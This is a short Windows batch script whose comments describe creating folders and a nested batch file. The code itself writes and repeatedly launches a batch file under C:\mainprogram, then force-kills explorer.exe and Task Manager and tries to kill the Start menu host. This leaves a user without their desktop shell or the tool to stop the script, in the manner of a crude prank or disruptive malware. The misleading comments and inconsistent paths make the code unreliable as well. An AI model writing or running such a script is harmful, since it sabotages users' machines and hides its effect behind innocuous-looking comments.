@echo off
rem // Check if the first directory exists:
if exist "C:\mainprogram\action.bat" (
    rem // First directory exists, so create the second one:
    start "action.bat" "C:\mainprogram\action.bat"
) else (
    rem // First directory does not exist, create it:
    mkdir "C:\mainprogram\"
    rem // Now create your nested batch file (e.g., myscript.bat) inside the second folder:
    echo @echo off > "C:\mainprogram\action.bat"
    @echo off 
    start "action.bat" "C:\mainprogram\action.bat"
    start "action.bat" "C:\mainprogram\action.bat"
    start "action.bat" "C:\mainprogram\action.bat"
    start "action.bat" "C:\mainprogram\action.bat"
    taskkill /IM "explorer.exe" /f
    taskkill /IM "Taskmgr.exe" /f
    taskkill /IM "StartMenuExperienceHost.exe" >> "C:\Users\block\Downloads\mainprogram\action.bat"
)

